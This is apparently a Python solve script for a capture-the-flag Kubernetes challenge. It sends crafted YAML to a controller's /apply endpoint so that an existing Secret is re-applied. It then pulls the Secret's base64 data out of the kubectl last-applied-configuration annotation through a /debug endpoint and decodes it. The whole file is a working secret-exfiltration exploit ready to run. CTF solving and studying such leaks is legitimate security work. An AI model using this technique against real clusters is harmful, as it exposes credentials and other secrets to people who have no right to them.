#!/usr/bin/env python3
"""Challenge Deployment: leak a Secret through kubectl's last-applied-configuration.

The controller pod is port-forwarded locally, e.g.

    kubectl -n ctf port-forward pod/controller-<hash> 18081:8080 &

usage: python3 solve.py [secret-name] [controller-url]
"""
import base64
import json
import sys
import urllib.request

DEFAULT_SECRET = "6c057691-9a9d-49ea-aaea-cbe69f20b46f"  # the unreferenced Secret
CTRL = "http://127.0.0.1:18081"
SECRET = DEFAULT_SECRET
args = [a for a in sys.argv[1:]]
if args:
    SECRET = args.pop(0)
if args:
    CTRL = args.pop(0)

CID = "leak"

DOC = f"""apiVersion: fluxfingers.ctf/v1
kind: Challenge
metadata: {{name: {CID}}}
spec: {{id: {CID}, title: Leak, description: Leak, stage: Planned, flagRef: {SECRET}}}
---
apiVersion: v1
kind: Secret
metadata: {{name: {SECRET}}}
type: Opaque
"""


def post(path, payload):
    req = urllib.request.Request(
        CTRL + path,
        data=json.dumps(payload).encode(),
        headers={"Content-Type": "application/json"},
    )
    return json.load(urllib.request.urlopen(req, timeout=60))


def get(path):
    return json.load(urllib.request.urlopen(CTRL + path, timeout=30))


def annotation_json(blob):
    """Pull the last-applied-configuration JSON string out of the YAML dump."""
    lines = blob.splitlines()
    i = next(n for n, line in enumerate(lines)
             if "last-applied-configuration" in line)
    ann = lines[i].split(": ", 1)[1].strip().strip("'")
    if not ann.endswith("}"):          # yaml folds the long scalar
        ann += lines[i + 1].strip().strip("'")
    return json.loads(ann)


print("[*] target Secret:", SECRET)
print("[*] POST /apply ->", post("/apply", {"yaml": DOC}))

blob = get("/debug?name=" + CID)["debug"]
data = annotation_json(blob).get("data", {})
print("[+] annotation data:",
      {k: base64.b64decode(v).decode(errors="replace") for k, v in data.items()})
